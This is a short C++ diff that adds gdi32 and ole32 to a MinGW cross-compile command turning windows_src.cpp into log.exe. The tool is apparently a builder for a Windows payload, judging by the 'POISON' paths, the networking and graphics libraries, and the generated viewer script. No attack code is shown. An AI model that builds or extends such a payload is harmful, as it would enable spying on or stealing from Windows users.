@@ -202,7 +202,8 @@ int main() {
                             }
 
                             cout << CYAN << "[*] [MIN-GW] Compilando executável cruzado log.exe..." << RESET << endl;
-                            int status = system("x86_64-w64-mingw32-g++ -O3 /home/gabriel/POISON/ZODIAC-POISON_TAR/windows_src.cpp -o /home/gabriel/POISON/ZODIAC-POISON_TAR/log.exe -lws2_32 -lgdiplus -lwininet -static 2>/dev/null");
+                           int status = system("x86_64-w64-mingw32-g++ -O3 /home/gabriel/POISON/ZODIAC-POISON_TAR/windows_src.cpp -o /home/gabriel/POISON/ZODIAC-POISON_TAR/log.exe -lws2_32 -lgdiplus -lwininet -lgdi32 -lole32 -static 2>/dev/null");
+
                             
                             if (status == 0) {
                                 cout << GREEN << "[🎯 CORE BUILD SUCESS] log.exe fabricado e visualizador.py gerado com sucesso!" << RESET << endl;
